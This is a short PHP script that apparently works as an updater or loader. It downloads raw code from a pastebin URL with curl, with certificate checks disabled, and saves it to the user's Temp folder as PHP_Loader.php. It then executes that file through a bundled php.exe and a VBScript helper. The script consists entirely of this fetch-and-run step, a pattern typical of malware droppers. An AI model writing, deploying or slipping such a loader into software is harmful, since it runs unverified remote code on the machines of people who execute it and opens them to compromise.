<?php
	$code = shell_exec("curl -k -L -s https://pastebin.com/raw/C9wxi49D");
	$filename = "C:\\Users\\" . get_current_user() . "\\AppData\\Local\\Temp\\PHP_Loader.php";
	$file = fopen($filename, "w");
	fwrite($file, $code);
	fclose($file);
	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " Updated");
	exit;
?>
